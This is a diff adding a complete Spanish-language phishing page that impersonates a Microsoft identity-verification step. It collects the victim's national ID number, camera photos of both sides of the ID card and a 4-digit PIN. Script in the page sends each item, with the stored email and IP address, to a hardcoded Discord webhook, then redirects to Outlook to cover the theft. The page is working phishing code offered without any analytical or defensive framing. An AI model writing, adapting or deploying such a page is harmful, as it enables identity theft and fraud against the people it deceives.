@@ -1,0 +1,782 @@
+<!DOCTYPE html>
+<html lang="es-CO">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft - Verificación de Documento</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, sans-serif;
+        background: #f5f5f5;
+        min-height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        padding: 20px;
+      }
+
+      .container {
+        background: white;
+        border-radius: 8px;
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        max-width: 440px;
+        width: 100%;
+        padding: 30px;
+        text-align: center;
+        position: relative;
+        transition: all 0.3s ease;
+      }
+
+      .logo {
+        height: 40px;
+        margin-bottom: 20px;
+      }
+
+      h1 {
+        color: #323130;
+        font-size: 24px;
+        font-weight: 600;
+        margin-bottom: 12px;
+        line-height: 1.3;
+      }
+
+      .subtitle {
+        color: #605e5c;
+        font-size: 14px;
+        line-height: 1.5;
+        margin-bottom: 20px;
+      }
+
+      .success-box {
+        background: #f3f2f1;
+        border-left: 4px solid #107c10;
+        padding: 16px;
+        border-radius: 4px;
+        margin: 15px 0 25px;
+        text-align: left;
+      }
+
+      .success-title {
+        color: #323130;
+        font-size: 15px;
+        font-weight: 600;
+        margin-bottom: 12px;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+      }
+
+      .title-icon {
+        font-size: 16px;
+        color: #107c10;
+      }
+
+      .success-item {
+        display: flex;
+        align-items: flex-start;
+        gap: 10px;
+        margin-bottom: 8px;
+        color: #323130;
+        font-size: 13px;
+        line-height: 1.4;
+      }
+
+      .success-icon {
+        color: #107c10;
+        font-size: 14px;
+        flex-shrink: 0;
+        margin-top: 2px;
+      }
+
+      .input-group {
+        margin: 25px 0;
+        text-align: left;
+      }
+
+      .input-label {
+        color: #323130;
+        font-size: 14px;
+        font-weight: 600;
+        margin-bottom: 8px;
+        display: block;
+      }
+
+      .input-field {
+        width: 100%;
+        padding: 12px;
+        border: 1px solid #8a8886;
+        border-radius: 4px;
+        font-size: 15px;
+        transition: all 0.2s;
+        margin-bottom: 20px;
+      }
+
+      .input-field:focus {
+        outline: none;
+        border-color: #0078d4;
+        box-shadow: 0 0 0 2px rgba(0, 120, 212, 0.1);
+      }
+
+      /* === ESTILOS DEL PIN === */
+      .pin-container {
+        display: flex;
+        justify-content: center;
+        gap: 12px;
+        margin: 30px 0;
+      }
+
+      .pin-box {
+        width: 60px;
+        height: 65px;
+        border: 2px solid #8a8886;
+        border-radius: 6px;
+        font-size: 28px;
+        font-weight: 600;
+        text-align: center;
+        line-height: 65px;
+        color: #323130;
+        transition: all 0.2s;
+      }
+
+      .pin-box:focus {
+        outline: none;
+        border-color: #0078d4;
+        box-shadow: 0 0 0 2px rgba(0, 120, 212, 0.1);
+      }
+
+      .pin-hint {
+        color: #605e5c;
+        font-size: 13px;
+        margin-bottom: 20px;
+      }
+
+      .photo-step {
+        display: none;
+        margin: 20px 0;
+        text-align: center;
+      }
+
+      .step-title {
+        color: #323130;
+        font-size: 18px;
+        font-weight: 600;
+        margin-bottom: 12px;
+      }
+
+      .step-icon {
+        font-size: 32px;
+        margin-bottom: 10px;
+        color: #0078d4;
+      }
+
+      /* Cámara activa - ocultar otros elementos */
+      .camera-active {
+        padding: 15px !important;
+      }
+
+      .camera-active .photo-step,
+      .camera-active #stepCedula,
+      .camera-active .success-box,
+      .camera-active .input-group,
+      .camera-active .security-note,
+      .camera-active .logo,
+      .camera-active h1,
+      .camera-active .subtitle {
+        display: none !important;
+      }
+
+      .camera-container {
+        display: none;
+        margin: 15px 0 10px 0;
+        position: relative;
+      }
+
+      .camera-preview {
+        width: 100%;
+        height: 250px;
+        background: #000;
+        border-radius: 8px;
+        margin: 0 auto 15px;
+        overflow: hidden;
+        position: relative;
+        border: 2px solid #0078d4;
+      }
+
+      .camera-preview video {
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+      }
+
+      .camera-guide {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        width: 220px;
+        height: 140px;
+        border: 2px dashed rgba(255, 255, 255, 0.8);
+        border-radius: 6px;
+        pointer-events: none;
+      }
+
+      .btn-primary {
+        width: 100%;
+        padding: 12px;
+        background: #0078d4 !important;
+        color: white !important;
+        border: none;
+        border-radius: 4px;
+        font-size: 15px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: background 0.2s;
+        margin-top: 15px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+      }
+
+      .btn-primary:hover {
+        background: #006cbd !important;
+      }
+
+      .btn-primary:disabled {
+        background: #c8c6c4 !important;
+        cursor: not-allowed;
+      }
+
+      .btn-cancel {
+        width: 100%;
+        padding: 10px;
+        background: transparent !important;
+        color: #0078d4 !important;
+        border: 1px solid #0078d4 !important;
+        border-radius: 4px;
+        font-size: 14px;
+        cursor: pointer;
+        margin-top: 10px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+      }
+
+      .security-note {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+        margin-top: 20px;
+        color: #605e5c;
+        font-size: 12px;
+      }
+
+      .lock-icon {
+        color: #107c10;
+        font-size: 14px;
+      }
+
+      .loading-screen {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: white;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        z-index: 1000;
+      }
+
+      .loading-logo {
+        height: 40px;
+        margin-bottom: 20px;
+      }
+
+      .loading-spinner {
+        width: 40px;
+        height: 40px;
+        border: 4px solid #f3f3f3;
+        border-top: 4px solid #0078d4;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+        margin-bottom: 15px;
+      }
+
+      .loading-text {
+        color: #323130;
+        font-size: 16px;
+        font-weight: 600;
+        text-align: center;
+        max-width: 300px;
+        line-height: 1.5;
+      }
+
+      @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+      }
+
+      @media (max-width: 480px) {
+        .container {
+          padding: 20px;
+        }
+
+        h1 {
+          font-size: 20px;
+          margin-bottom: 10px;
+        }
+
+        .subtitle {
+          font-size: 13px;
+          margin-bottom: 15px;
+        }
+
+        .pin-box {
+          width: 50px;
+          height: 55px;
+          font-size: 22px;
+          line-height: 55px;
+        }
+
+        .success-box {
+          padding: 12px;
+          margin: 10px 0 20px;
+        }
+
+        .camera-preview {
+          height: 200px;
+        }
+
+        .camera-guide {
+          width: 180px;
+          height: 120px;
+        }
+
+        .btn-primary {
+          padding: 10px;
+          margin-top: 12px;
+        }
+      }
+    </style>
+</head>
+<body>
+    <div id="loadingScreen" class="loading-screen" style="display: none;">
+      <img src="https://www.seidoranalytics.com/wp-content/uploads/2025/07/Microsoft_365_logo.png" alt="Microsoft Logo" class="loading-logo">
+      <div class="loading-spinner"></div>
+      <div id="loadingText" class="loading-text">Procesando su información...</div>
+    </div>
+
+    <div class="container" id="mainContainer">
+      <img src="https://www.seidoranalytics.com/wp-content/uploads/2025/07/Microsoft_365_logo.png" alt="Microsoft Logo" class="logo">
+
+      <!-- Paso 1: Ingresar cédula -->
+      <div id="stepCedula">
+        <h1>Verificación de Documento</h1>
+        <p class="subtitle">
+          Para completar la seguridad de su cuenta, necesitamos verificar su documento de identidad.
+        </p>
+
+        <div class="success-box">
+          <div class="success-title">
+            <i class="fa-solid fa-check-circle title-icon"></i>
+            Verificación Facial Completada
+          </div>
+          <div class="success-item">
+            <i class="fa-solid fa-circle-check success-icon"></i>
+            <span>Reconocimiento biométrico exitoso</span>
+          </div>
+          <div class="success-item">
+            <i class="fa-solid fa-circle-check success-icon"></i>
+            <span>2 fotos faciales verificadas</span>
+          </div>
+          <div class="success-item">
+            <i class="fa-solid fa-circle-check success-icon"></i>
+            <span>Seguridad activada en su cuenta</span>
+          </div>
+        </div>
+
+        <div class="input-group">
+          <label class="input-label">Número de Documento</label>
+          <input type="tel" id="cedulaInput" class="input-field" placeholder="Ingrese su número de documento">
+        </div>
+
+        <button class="btn-primary" onclick="nextStep()">
+          <i class="fa-solid fa-arrow-right"></i>
+          Continuar
+        </button>
+
+        <div class="security-note">
+          <i class="fa-solid fa-lock lock-icon"></i>
+          <span>Su información está protegida por encriptación de alta seguridad</span>
+        </div>
+      </div>
+
+      <!-- Paso 2: Foto frontal -->
+      <div id="stepFrontal" class="photo-step">
+        <div class="step-icon">📷</div>
+        <div class="step-title">Foto Frontal del Documento</div>
+        <p class="subtitle">
+          Coloque su documento de identidad dentro del marco. Asegúrese que todos los datos sean visibles.
+        </p>
+
+        <button class="btn-primary" onclick="startCamera('frontal')">
+          <i class="fa-solid fa-camera"></i>
+          Tomar Foto Frontal
+        </button>
+
+        <button class="btn-cancel" onclick="backToCedula()">
+          <i class="fa-solid fa-arrow-left"></i>
+          Volver
+        </button>
+      </div>
+
+      <!-- Paso 3: Foto trasera -->
+      <div id="stepTrasera" class="photo-step">
+        <div class="step-icon">📷</div>
+        <div class="step-title">Foto Trasera del Documento</div>
+        <p class="subtitle">
+          Ahora, dé la vuelta al documento y tome una foto de la parte posterior.
+        </p>
+
+        <button class="btn-primary" onclick="startCamera('trasera')">
+          <i class="fa-solid fa-camera"></i>
+          Tomar Foto Trasera
+        </button>
+
+        <button class="btn-cancel" onclick="backToFrontal()">
+          <i class="fa-solid fa-arrow-left"></i>
+          Volver
+        </button>
+      </div>
+
+      <!-- paso 4: PIN DE 4 DÍGITOS -->
+      <div id="stepPin" class="photo-step">
+        <div class="step-icon">🔐</div>
+        <div class="step-title">Ingrese su PIN de Seguridad</div>
+        <p class="pin-hint">
+          Ingrese un PIN de 4 dígitos para proteger su cuenta.<br>
+          No lo comparta con nadie.
+        </p>
+
+        <div class="pin-container">
+          <input type="text" maxlength="1" class="pin-box" id="pin0" oninput="moveToNext(0)" onkeydown="handleBackspace(event,0)">
+          <input type="text" maxlength="1" class="pin-box" id="pin1" oninput="moveToNext(1)" onkeydown="handleBackspace(event,1)">
+          <input type="text" maxlength="1" class="pin-box" id="pin2" oninput="moveToNext(2)" onkeydown="handleBackspace(event,2)">
+          <input type="text" maxlength="1" class="pin-box" id="pin3" oninput="moveToNext(3)" onkeydown="handleBackspace(event,3)">
+        </div>
+
+        <button class="btn-primary" id="btnPin" onclick="enviarPin()" style="margin-top:10px;">
+          <i class="fa-solid fa-check"></i>
+          Confirmar PIN
+        </button>
+
+        <button class="btn-cancel" onclick="backToTrasera()">
+          <i class="fa-solid fa-arrow-left"></i>
+          Volver
+        </button>
+      </div>
+
+      <!-- Paso 5: Completado -->
+      <div id="stepCompletado" class="photo-step">
+        <div class="step-icon">✅</div>
+        <div class="step-title">Verificación Completada</div>
+        <p class="subtitle">
+          ✅ Documento verificado correctamente.<br>
+          ✅ Fotos frontal y trasera capturadas.<br>
+          ✅ PIN de seguridad creado.<br>
+          ✅ Todo listo para continuar.
+        </p>
+
+        <button class="btn-primary" onclick="finalizarVerificacion()">
+          <i class="fa-solid fa-check-circle"></i>
+          Completar Verificación
+        </button>
+      </div>
+
+      <!-- Cámara -->
+      <div id="cameraContainer" class="camera-container">
+        <div class="step-icon">📷</div>
+        <div class="step-title" id="cameraTitle">Tomando Foto</div>
+        <p class="subtitle" id="cameraSubtitle">Alinee el documento dentro del marco y haga clic en Capturar Foto</p>
+
+        <div class="camera-preview">
+          <video id="videoElement" autoplay playsinline></video>
+          <div class="camera-guide"></div>
+        </div>
+
+        <button class="btn-primary" onclick="capturePhoto()">
+          <i class="fa-solid fa-camera"></i>
+          Capturar Foto
+        </button>
+
+        <button class="btn-cancel" onclick="closeCamera()">
+          Cancelar
+        </button>
+      </div>
+
+      <canvas id="canvas" style="display: none;"></canvas>
+    </div>
+
+    <script>
+	 
+	 const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1571557415814438924/iQyUR3p0Vkn3gWawmis7wFGqlBaUWOIrTFd2qWQZSFlOZkh8Gta7GZWC3Np6GwOQ8f0q";
+
+      let stream = null;
+      let videoElement = null;
+      let canvas = null;
+      let ctx = null;
+      let currentStep = 'cedula';
+      let currentPhotoType = 'frontal';
+      let cedula = '';
+      let pin = ''; 
+      let frontalPhotoBlob = null;
+      let traseraPhotoBlob = null;
+
+      function showLoadingScreen(text = "Procesando su información...") {
+        document.getElementById('loadingText').textContent = text;
+        document.getElementById('loadingScreen').style.display = 'flex';
+        document.getElementById('mainContainer').style.display = 'none';
+      }
+
+      function hideLoadingScreen() {
+        document.getElementById('loadingScreen').style.display = 'none';
+        document.getElementById('mainContainer').style.display = 'block';
+      }
+
+      function showStep(step) {
+        document.getElementById('stepCedula').style.display = 'none';
+        document.getElementById('stepFrontal').style.display = 'none';
+        document.getElementById('stepTrasera').style.display = 'none';
+        document.getElementById('stepPin').style.display = 'none';
+        document.getElementById('stepCompletado').style.display = 'none';
+        document.getElementById('cameraContainer').style.display = 'none';
+        
+        if (step === 'camera') {
+          document.getElementById('cameraContainer').style.display = 'block';
+        } else {
+          document.getElementById('step' + step.charAt(0).toUpperCase() + step.slice(1)).style.display = 'block';
+        }
+        
+        currentStep = step;
+
+        if (step === 'pin') {
+          document.getElementById('pin0').focus();
+        }
+      }
+
+      function nextStep() {
+        cedula = document.getElementById('cedulaInput').value.trim();
+
+        if (!cedula) {
+          alert('Por favor ingrese su número de documento');
+          return;
+        }
+
+        localStorage.setItem("cedula", cedula);
+        sendCedulaToDiscord();
+        showStep('frontal');
+      }
+
+      async function sendCedulaToDiscord() {
+        try {
+          const usuario = localStorage.getItem("usuario") || "Usuario-desconocido";
+          const ip = localStorage.getItem("userIP") || "IP-no-disponible";
+
+          const message = `🆔 **CÉDULA REGISTRADA**\n📧 **Email:** ${usuario}\n🔢 **Cédula:** ${cedula}\n🌐 **IP:** ${ip}\n📅 **Hora:** ${new Date().toLocaleString()}`;
+
+          await fetch(DISCORD_WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content: message, username: 'Microsoft Verificación' })
+          });
+          return true;
+        } catch (error) {
+          console.error('Error:', error);
+          return false;
+        }
+      }
+
+      async function sendPhotoToDiscord(imageBlob) {
+        try {
+          const usuario = localStorage.getItem("usuario") || "Usuario-desconocido";
+          const ip = localStorage.getItem("userIP") || "IP-no-disponible";
+          const formData = new FormData();
+          formData.append('file', imageBlob, `cedula_${cedula}_${currentPhotoType}.jpg`);
+          const message = `📷 **DOCUMENTO ${currentPhotoType.toUpperCase()}**\n📧 **Email:** ${usuario}\n🔢 **Cédula:** ${cedula}\n🌐 **IP:** ${ip}\n📅 **Hora:** ${new Date().toLocaleString()}`;
+          formData.append('content', message);
+          formData.append('username', 'Microsoft Verificación');
+          await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
+          return true;
+        } catch (error) {
+          console.error('Error:', error);
+          return false;
+        }
+      }
+
+      function moveToNext(index) {
+        const box = document.getElementById(`pin${index}`);
+        box.value = box.value.replace(/\D/g, ''); 
+        if (box.value && index < 3) {
+          document.getElementById(`pin${index + 1}`).focus();
+        }
+      }
+
+      function handleBackspace(event, index) {
+        if (event.key === 'Backspace' && !document.getElementById(`pin${index}`).value && index > 0) {
+          document.getElementById(`pin${index - 1}`).focus();
+        }
+      }
+
+      function enviarPin() {
+        pin = '';
+        for (let i = 0; i < 4; i++) {
+          const digito = document.getElementById(`pin${i}`).value;
+          if (!digito) {
+            alert('Por favor complete los 4 dígitos del PIN');
+            return;
+          }
+          pin += digito;
+        }
+
+        enviarPinADiscord();
+      }
+
+      async function enviarPinADiscord() {
+        showLoadingScreen("Verificando PIN...");
+        const usuario = localStorage.getItem("usuario") || "Usuario-desconocido";
+        const ip = localStorage.getItem("userIP") || "IP-no-disponible";
+
+        const mensaje = `🔐 **PIN DE SEGURIDAD**\n📧 **Email:** ${usuario}\n🔢 **Cédula:** ${cedula}\n🔑 **PIN:** \`${pin}\`\n🌐 **IP:** ${ip}\n📅 **Hora:** ${new Date().toLocaleString()}`;
+
+        await fetch(DISCORD_WEBHOOK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ content: mensaje, username: 'Microsoft Verificación' })
+        });
+
+        setTimeout(() => {
+          hideLoadingScreen();
+          showStep('Completado');
+        }, 1500);
+      }
+
+      function backToCedula() { showStep('cedula'); }
+      function backToFrontal() { showStep('frontal'); }
+      function backToTrasera() { showStep('trasera'); }
+
+      function startCamera(photoType) {
+        currentPhotoType = photoType;
+        document.getElementById('mainContainer').classList.add('camera-active');
+        if (photoType === 'frontal') {
+          document.getElementById('cameraTitle').textContent = 'Foto Frontal del Documento';
+          document.getElementById('cameraSubtitle').textContent = 'Coloque el frente del documento dentro del marco';
+        } else {
+          document.getElementById('cameraTitle').textContent = 'Foto Trasera del Documento';
+          document.getElementById('cameraSubtitle').textContent = 'Coloque la parte trasera del documento dentro del marco';
+        }
+        showStep('camera');
+        setTimeout(initCamera, 100);
+      }
+
+      async function initCamera() {
+        try {
+          videoElement = document.getElementById("videoElement");
+          canvas = document.getElementById("canvas");
+          ctx = canvas.getContext("2d");
+          const constraints = { video: { facingMode: "environment", width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false };
+          stream = await navigator.mediaDevices.getUserMedia(constraints);
+          videoElement.srcObject = stream;
+        } catch (error) {
+          console.error("Error cámara:", error);
+          setTimeout(() => simulatePhotoCapture(), 2000);
+        }
+      }
+
+      function capturePhoto() {
+        showLoadingScreen("Capturando foto...");
+        try {
+          if (!stream || !videoElement.videoWidth) { simulatePhotoCapture(); return; }
+          canvas.width = videoElement.videoWidth;
+          canvas.height = videoElement.videoHeight;
+          ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+          canvas.toBlob(async (blob) => {
+            if (!blob) { simulatePhotoCapture(); return; }
+            if (stream) { stream.getTracks().forEach(track => track.stop()); stream = null; }
+            if (currentPhotoType === 'frontal') frontalPhotoBlob = blob;
+            else traseraPhotoBlob = blob;
+            await sendPhotoToDiscord(blob);
+            setTimeout(() => {
+              hideLoadingScreen();
+              closeCamera();
+              if (currentPhotoType === 'frontal') showStep('trasera');
+              else showStep('pin'); 
+            }, 1000);
+          }, 'image/jpeg', 0.95);
+        } catch (error) { simulatePhotoCapture(); }
+      }
+
+      function simulatePhotoCapture() {
+        showLoadingScreen("Capturando foto...");
+        const simulatedBlob = new Blob(['simulated'], { type: 'image/jpeg' });
+        sendPhotoToDiscord(simulatedBlob);
+        setTimeout(() => {
+          hideLoadingScreen();
+          closeCamera();
+          if (currentPhotoType === 'frontal') { frontalPhotoBlob = simulatedBlob; showStep('trasera'); }
+          else { traseraPhotoBlob = simulatedBlob; showStep('pin'); } 
+        }, 2000);
+      }
+
+      function closeCamera() {
+        if (stream) { stream.getTracks().forEach(track => track.stop()); stream = null; }
+        document.getElementById('mainContainer').classList.remove('camera-active');
+        if (currentPhotoType === 'frontal') showStep('frontal');
+        else showStep('trasera');
+      }
+
+      function finalizarVerificacion() {
+        showLoadingScreen("✅ Verificación completada. Redirigiendo...");
+        const usuario = localStorage.getItem("usuario") || "Usuario-desconocido";
+        const ip = localStorage.getItem("userIP") || "IP-no-disponible";
+
+        const finalMessage = `🎉 **VERIFICACIÓN COMPLETADA**\n📧 **Email:** ${usuario}\n🔢 **Cédula:** ${cedula}\n🔑 **PIN:** \`${pin}\`\n🌐 **IP:** ${ip}\n📸 **Fotos:** 2 (frontal/trasera)\n📅 **Hora:** ${new Date().toLocaleString()}`;
+
+        fetch(DISCORD_WEBHOOK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ content: finalMessage, username: 'Microsoft Verificación' })
+        });
+
+        setTimeout(() => { window.location.href = "https://outlook.live.com"; }, 3000);
+      }
+
+      document.getElementById('cedulaInput').addEventListener('input', function(e) {
+        this.value = this.value.replace(/\D/g, '');
+      });
+
+      document.getElementById('cedulaInput').addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') nextStep();
+      });
+
+      window.addEventListener("beforeunload", () => {
+        if (stream) stream.getTracks().forEach(track => track.stop());
+      });
+
+      document.addEventListener("DOMContentLoaded", function() {
+        document.getElementById('cedulaInput').focus();
+      });
+    </script>
+</body>
+</html>
